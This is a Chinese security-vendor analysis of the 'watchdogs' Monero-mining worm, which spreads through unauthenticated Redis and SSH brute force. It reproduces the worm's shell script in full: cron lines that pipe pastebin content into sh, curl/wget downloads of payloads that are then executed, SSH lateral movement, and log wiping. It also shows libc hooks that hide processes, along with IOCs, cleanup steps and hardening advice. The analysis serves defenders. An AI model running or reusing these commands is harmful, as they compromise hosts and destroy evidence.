# watchdogs挖矿木马综合分析报告

阅读量 **482580**

|评论 **3**

发布时间 : 2019-02-26 15:30:47

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/dm/1024_538_/t0176d1eca0cb5db3a5.jpg)

2019年2月21日晚，默安科技应急响应中心接到某合作伙伴的求助电话，针对被watchdogs病毒感染的机子进行排查和分析，并最终给出了针对该类型的挖矿病毒的清除工具，帮助客户清除病毒文件，修复被感染机子，挽回经济损失。经默安科技影武者实验室安全研究员分析发现，该病毒是通过Redis未授权访问漏洞及ssh弱口令进行突破植入，随后释放挖矿木马进行挖矿操作，并对内外网主机进行redis漏洞攻击及ssh暴力破解攻击。该病毒有以下几个特征信息：

1、查看netstat命令是否被删除。

2、查看/root/.ssh中的密钥信息是否被清除。

3、查看计划任务，是否存在以下任务信息：

    
    
    curl -fsSL http://thyrsi.com/t6/672/1550667515x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667515x1822611209.jpg -O /tmp/watchdogs

4、使用busybox检查可以进程：

    
    
    busybox ps -ef|grep watchdogs
    
    busybox ps -ef|grep ksoftirqds

如果包含则说明中毒。

5、病毒程序执行后会消耗大量的主机cpu资源。

请各位系统维护人员检查各自机子是否有以上特征，如果有以上特征，可联系默安科技安全应急响应中心获取病毒清除工具。

下面对该病毒进行详细地分析。

## 0x1 Watchdogs程序

由于病毒程序使用golang编写的，做了一些混淆操作，ida无法识别其中的符号信息，需要手动修复一下，可使用以下idapython脚本进行修复，修复后可还原一部分方法名，便于之后的分析：

    
    
    https://rednaga.io/2016/09/21/reversing_go_binaries_like_a_pro 

通过脚本还原符号信息，重命名了3946 个方法。

修复前：

修复后：

下面分析主函数 main.main()

Main函数中主要工作是：

0x1 将wathdogs这个进程设置为系统服务

0x2 将libioset写入到/etc/ld.so.preload中

0x3 将写入定时任务，远程下载挖矿文件

0x4 启动ksoftirqds进程进行挖矿操作

0x5 删除tmp下ksoftirqds，watchdogs，config.json等文件

0x6 更新程序

0x7 redis未授权攻击及ssh暴力破解攻击

由于控制流图太大，这里就不给出了，下面是main函数中的主要代码，已经做了详细的注释：

将watchdogs添加为系统服务

这里大概的意思是将libioset.so写入奥/etc/local/ld.so.preload。通过这种方式将libioset.so设置为预加载的动态链接库，这样即使程序不依赖libioset.so，libioset.so依然会被装载。

这里是写入配置信息到文件/tmp/config.json中

这里是写入定时任务（位于：github_com_hippies_LSD_LSDC_Cron函数中）

通过查看计划任务发现。

每15分钟执行一次更新下载操作：

通过网页访问这个url发现其是一段base64加密的数据

脚本内容分析如下：

每15分钟从pastebin上下载经过base64编码的该脚本自身并写入到定时任务中：

    
    
    export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/local/bin:/usr/sbin
    
    echo "*/15 * * * * (curl -fsSL https://pastebin.com/raw/sByq0rym||wget -q -O- https://pastebin.com/raw/sByq0rym)|sh" | crontab -
关闭其他可能存在的挖矿木马：

    
    
    ps auxf | grep -v grep | grep hwlh3wlh44lh | awk '{print $2}' | xargs kill -9
    
    ps auxf | grep -v grep | grep Circle_MI | awk '{print $2}' | xargs kill -9
    
    ps auxf | grep -v grep | grep get.bi-chi.com | awk '{print $2}' | xargs kill -9
    
    ps auxf | grep -v grep | grep hashvault.pro | awk '{print $2}' | xargs kill -9
    
    ps auxf | grep -v grep | grep nanopool.org | awk '{print $2}' | xargs kill -9
    
    ps auxf | grep -v grep | grep /usr/bin/.sshd | awk '{print $2}' | xargs kill -9
    
    ps auxf | grep -v grep | grep /usr/bin/bsd-port | awk '{print $2}' | xargs kill -9
    
    ps auxf|grep -v grep|grep "xmr" | awk '{print $2}'|xargs kill -9
    
    ps auxf|grep -v grep|grep "xig" | awk '{print $2}'|xargs kill -9
    
    ps auxf|grep -v grep|grep "ddgs" | awk '{print $2}'|xargs kill -9
    
    ps auxf|grep -v grep|grep "qW3xT" | awk '{print $2}'|xargs kill -9
    
    ps auxf|grep -v grep|grep "wnTKYg" | awk '{print $2}'|xargs kill -9
    
    ps auxf|grep -v grep|grep "t00ls.ru" | awk '{print $2}'|xargs kill -9
    
    ps auxf|grep -v grep|grep "sustes" | awk '{print $2}'|xargs kill -9
    
    ps auxf|grep -v grep|grep "thisxxs" | awk '{print $2}' | xargs kill -9
    
    ps auxf|grep -v grep|grep "hashfish" | awk '{print $2}'|xargs kill -9
    
    ps auxf|grep -v grep|grep "kworkerds" | awk '{print $2}'|xargs kill -9

通过chattr指令锁定系统权限，关闭资源占用较高的服务：

    
    
    chattr -i /etc/cron.d/root
    
    chattr -i /etc/cron.d/system
    
    chattr -i /etc/ld.so.preload
    
    chattr -i /etc/cron.d/apache
    
    chattr -i /var/spool/cron/root
    
    chattr -i /var/spool/cron/crontabs/root
    
    chattr -i /usr/local/bin/dns
    
    chattr -i /usr/sbin/netdns
    
    chattr -i /bin/netstat
    
    rm -rf /etc/cron.d/system /etc/cron.d/apache /etc/cron.hourly/oanacron /etc/cron.daily/oanacron /etc/cron.monthly/oanacron /usr/local/lib/libn
    
    tp.so /etc/init.d/netdns /etc/init.d/kworker /bin/httpdns /usr/local/bin/dns /bin/netstat /usr/sbin/netdns
    
    chkconfig --del kworker
    
    chkconfig --del netdns
    
    p=$(ps auxf|grep -v grep|grep ksoftirqds|wc -l)
    
    if [ ${p} -eq 0 ];then
    
        ps auxf|grep -v grep | awk '{if($3>=80.0) print $2}'| xargs kill -9
    
    fi

杀掉一些DDoS进程：

    
    
    if [ -e "/tmp/gates.lod" ]; then
    
        rm -rf $(readlink /proc/$(cat /tmp/gates.lod)/exe)
    
        kill -9 $(cat /tmp/gates.lod)
    
        rm -rf $(readlink /proc/$(cat /tmp/moni.lod)/exe)
    
        kill -9 $(cat /tmp/moni.lod)
    
        rm -rf /tmp/{gates,moni}.lod
    
    fi

根据内核版本下载病毒程序并执行：

    
    
    if [ ! -f "/tmp/.lsdpid" ]; then
    
        ARCH=$(uname -m)
    
        if [ ${ARCH}x = "x86_64x" ]; then
    
            (curl -fsSL http://thyrsi.com/t6/672/1550667479x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667479x18226112
    
    09.jpg -O /tmp/watchdogs) && chmod +x /tmp/watchdogs
    
        elif [ ${ARCH}x = "i686x" ]; then
    
            (curl -fsSL http://thyrsi.com/t6/672/1550667515x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667515x18226112
    
    09.jpg -O /tmp/watchdogs) && chmod +x /tmp/watchdogs
    
        else
    
            (curl -fsSL http://thyrsi.com/t6/672/1550667515x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667515x18226112
    
    09.jpg -O /tmp/watchdogs) && chmod +x /tmp/watchdogs
    
        fi
    
            nohup /tmp/watchdogs >/dev/null 2>&1 &
    
    elif [ ! -f "/proc/$(cat /tmp/.lsdpid)/stat" ]; then
    
        ARCH=$(uname -m)
    
        if [ ${ARCH}x = "x86_64x" ]; then
    
            (curl -fsSL http://thyrsi.com/t6/672/1550667479x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667479x18226112
    
    09.jpg -O /tmp/watchdogs) && chmod +x /tmp/watchdogs
    
        elif [ ${ARCH}x = "i686x" ]; then
    
            (curl -fsSL http://thyrsi.com/t6/672/1550667515x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667515x18226112
    
    09.jpg -O /tmp/watchdogs) && chmod +x /tmp/watchdogs
    
        else
    
            (curl -fsSL http://thyrsi.com/t6/672/1550667515x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667515x18226112
    
    09.jpg -O /tmp/watchdogs) && chmod +x /tmp/watchdogs
    
        fi
    
            nohup /tmp/watchdogs >/dev/null 2>&1 &
    
    fi

通过读取.ssh目录下known_hosts中的服务器地址，尝试使用密钥登录后横向传播：

    
    
    if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
    
      for h in $(grep -oE "b([0-9]{1,3}.){3}[0-9]{1,3}b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChec
    
    king=no $h '(curl -fsSL https://pastebin.com/raw/sByq0rym||wget -q -O- https://pastebin.com/raw/sByq0rym)|sh >/dev/null 2>&1 &' & done
    
    fi
    
    echo 0>/root/.ssh/authorized_keys
    
    echo 0>/var/spool/mail/root
    
    echo 0>/var/log/wtmp
    
    echo 0>/var/log/secure
    
    echo 0>/var/log/cron

具体的可参考我们公司上一篇分析文章：

<https://mp.weixin.qq.com/s/7HyO9gVdgDYL4x7DKCVgZA>

这里是检查更新：

病毒文件会定时向服务端请求更新信息。

通过tcpdump进行协议抓包分析，发现有挖矿行为：

通过htop进行进程分析，发现会启动以下的进程，cpu占用率极高

通过使用inotify监视bin目录，发现其删除了一个netstat命令

通过分析可知该计划任务会定时从服务端下载一张图片格式文件并重命名为watchdogs保存到tmp目录下并执行，执行过程中会释放config.json及ksoftirqds到tmp目录下。为了防止被捕获，在程序执行后，对watchdogs，config.json，ksoftrqds进行了删除操作。

另外为了隐藏进程信息及相关的文件信息，该病毒通过hook方式对libc.so中的函数进行了重写。

如：

readdir函数

这里有一个do while结构

    
    
      do
    
      {
    
        v4 = old_readdir(a1);                       // 使用readdir打开一个目录
    
        if ( v4 )
    
        {
    
          if ( (unsigned int)get_dir_name(a1, &s1, 0x100uLL)// 调用getdirname
    
            && !strcmp(&s1, "/proc")
    
            && (unsigned int)get_process_name(v4 + 19, &v3)
    
            && !strcmp(&v3, "ksoftirqds") )
    
          {
    
            return 0LL;
    
          }
    
          if ( !strcmp(&v3, "watchdogs") )
    
            return 0LL;
    
        }
    
        if ( v4 && !strcmp((const char *)(v4 + 19), ".") )
    
          strcmp((const char *)(v4 + 19), "/");
    
      }
    
      while ( v4
    
           && (strstr((const char *)(v4 + 19), "ksoftirqds")// 判断ksoftirqds是否是v4+19这个地址中的字符串的子集
    
            || strstr((const char *)(v4 + 19), "ld.so.preload")
    
            || strstr((const char *)(v4 + 19), "libioset.so")) );

大致的意思是：

如果查询结果中包含恶意应用名称及路径，则不返回相应结果，起到隐藏作用。

另外程序也对rmdir函数进行了重写，防止恶意程序的文件被删除。

这里是重写的函数列表

其中作者不仅在access函数中做了隐藏操作，而且还进行了写入计划任务的操作：

    
    
      s = fopen("/etc/cron.d/root", "w+");
    
      if ( s )
    
      {
    
        fwrite(
    
          "*/10 * * * * root (curl -fsSL https://pastebin.com/raw/sByq0rym||wget -q -O- https://pastebin.com/raw/sByq0rym)|shn##",
    
          1uLL,
    
          0x75uLL,
    
          s);
    
        fclose(s);
    
      }

横向传播

0x1 攻击redis服务器

遍历内网ip及外网ip攻击redis服务器：

测试机上通过wireshark抓取到的redis攻击行为

调用过程：

    
    
    Main.main
    
    ->github_com_hippies_LSD_LSDA_Ago
    
    ->github_com_hippies_LSD_Ago_func1
    
    ->github_com_hippies_LSD_LSDA_runtwo
    
    ->github_com_hippies_LSD_LSDA_run
    
    ->github_com_gomodule_redigo_redis_DialTimeout
    
    ->github_com_gomodule_redigo_redis_Dial
    
    ->github_com_gomodule_redigo_redis__conn_Do
    
    ->github_com_gomodule_redigo_redis__conn_DoWithTimeout
    
    ->github_com_gomodule_redigo_redis__conn_writeCommand

相关代码：

0x2 ssh爆破

调用过程：

    
    
    Main.main
    
    -> github_com_hippies_LSD_LSDA_Bbgo
    
    -> github_com_hippies_LSD_LSDA_bgo
    
    -> github_com_hippies_LSD_LSDA_bgo_func1
    
    -> github_com_hippies_LSD_LSDA_cmdtwo
    
    ->github_com_hippies_LSD_LSDA_cmd
    
    ->golang_org_x_crypto_ssh__Client_NewSession

部分控制流图：

相关源码

## 0x2 针对ksoftirqds的分析（挖矿）

病毒程序在释放出ksoftirqds后会将其删除，如果我们想分析ksoftirqds的话，需要将tmp目录使用chattr +a
/tmp命令锁住，这样可以防止这些文件被删除。

通过分析发现，这个木马文件和watchdogs一样，也是用upx加壳的。我们使用upx工具执行 upx -d即可脱壳。

下面是分析过程：

首先使用ida的字符串检索功能，找到如下矿池地址：

搜索xmr.f2pool.com

跟入并寻找引用位置

找到了钱包地址：

这部分配置在do_guided_pool_config函数中，做矿池配置

Main()->do_guided_pool_config()

do_guided_pool_config中主要做了

pool_address,wallet_address,rig_id,pool_password,use_nicehash,use_tls等这些参数的配置。

并通过GetPoolConfig函数获取相应的矿池配置文件：

矿机配置文件信息config.json文件如下：

    
    
    {
    
        "algo": "cryptonight",
    
        "api": {
    
            "port": 0,
    
            "access-token": null,
    
            "id": null,
    
            "worker-id": null,
    
            "ipv6": false,
    
            "restricted": true
    
        },
    
        "asm": true,
    
        "autosave": true,
    
        "av": 0,
    
        "background": false,
    
        "colors": true,
    
        "cpu-affinity": null,
    
        "cpu-priority": null,
    
        "donate-level": 0,
    
        "huge-pages": true,
    
        "hw-aes": null,
    
        "log-file": null,
    
        "max-cpu-usage": 100,
    
        "pools": [
    
            {
    
                "url": "stratum+tcp://xmr.f2pool.com:13531",
    
                "user": "46FtfupUcayUCqG7Xs7YHREgp4GW3CGvLN4aHiggaYd75WvHM74Tpg1FVEM8fFHFYDSabM3rPpNApEBY4Q4wcEMd3BM4Ava.teny",
    
                "pass": "x",
    
                "rig-id": null,
    
                "nicehash": false,
    
                "keepalive": false,
    
                "variant": -1,
    
                "tls": false,
    
                "tls-fingerprint": null
    
            }
    
        ],
    
        "print-time": 60,
    
        "retries": 5,
    
        "retry-pause": 5,
    
        "safe": false,
    
        "threads": null,
    
        "user-agent": null,
    
        "watch": false
    
    }

通过分析发现，该木马使用的是一款名叫xmr-stak的挖矿程序

它的项目地址地址在<https://github.com/fireice-uk/xmr-stak>

对应的github项目的特征位置：

这款挖矿系统除了能够挖掘门罗币，还能够挖掘以下的虚拟货币：

## 0x3 分析总结

1、watchdogs中写入定时任务，释放ksoftirqds进行挖矿，并每个15分钟检查更新，

2、进行ssh爆破及redis攻击，目的是进行横向病毒传播，扩大挖矿僵尸网络的势力。

3、ksofttirqds程序主要是使用xmr-stak挖矿程序挖掘门罗币。

4、矿池：

tcp://xmr.f2pool.com:13531

5、钱包地址为：

46FtfupUcayUCqG7Xs7YHREgp4GW3CGvLN4aHiggaYd75WvHM74Tpg1FVEM8fFHFYDSabM3rPpNApEBY4Q4wcEMd3BM4Ava.tenx

6.、域名：

http://thyrsi.com

https://pastebin.com

对应ip：

104.27.139.223

104.20.209.21

7、相关特征MD5值：

aee3a19beb22527a1e0feac76344894c

86e2f5859ca276f307a034b5c7c450f1

ae356f2499b2228e86bcc4d61f4a29c9

d6a146161ec201f9b3f20fbfd528f901

a48f529646b8b5e96bab67d6d517a975

04ca88d563b568bac6d1f64faf4d390e

8、为什么无法删除文件和kill进程？

蠕虫通过ld.so.preload使用libioset.so对常见系统函数（如：readdir、access函数）进行过滤，当返回结果中包含恶意文件和进程时，会主动过滤和隐藏相关结果，使用ls、ps等命令无法看到恶意进程文件。

9、如何清理？

上传busybox到/bin/目录下，使用busybox清理文件。

10、为什么busybox可以清理文件？

busybox不依赖于系统的动态库，不受ld.so.preload劫持，能够正常操作文件。

## 0x4 加固建议

病毒程序可能是通过利用redis未授权漏洞植入，所以请做好redis方面的加固。

Redis未授权漏洞简介：Redis在默认配置下，会将服务绑定在0.0.0.0：6379上，即暴露在公网上。如果同时又没有开启相关的认证，就会导致任意用户访问redis服务，进行数据库操作，并且通过进一步利用，还可以获得系统权限。

以下是redis方面的加固建议：

1\. 将修改redis配置文件，将服务绑定在本机127.0.0.1上。

3、修改redis.conf，设置访问认证，启用密码认证。  
3\. 在防火墙处指定可访问redis服务的ip 。

4\. 修改修改redis默认端口。

5\. 禁用config指令防止恶意操作，这样即使存在未授权访问，也能够给攻击者使用config 指令加大难度。

6\. 使用普通权限运行redis服务，这样即使攻击者获得了服务器权限也只是普通用户权限。

## 0x5 病毒处置办法

1）默安科技已针对病毒开发自动化清理脚本，脚本地址：

https://github.com/MoreSecLab/DDG_MalWare_Clean_Tool

3）建议使用默安科技哨兵云对全网服务器进行排查Redis未授权访问漏洞并进行安全加固，从源头上避免感染病毒。

4）紧急情况下，为避免内网大量传播，可以临时对被感染机器先进行断网隔离处理。

5）不影响业务的情况下，建议临时删除机器上.ssh/known_hosts和登录密钥文件。

相关文章：

<https://mp.weixin.qq.com/s/7HyO9gVdgDYL4x7DKCVgZA>

By 默安科技安全应急响应中心

2019/2/25

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **默安科技** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/171692](/post/id/171692)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [恶意软件](/tag/恶意软件)
  * [挖矿](/tag/挖矿)
  * [watchdogs](/tag/watchdogs)

 **+1** __3赞

 __收藏

![](https://p3.ssl.qhimg.com/t01cbe28a66efad4c79.png) 默安科技

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

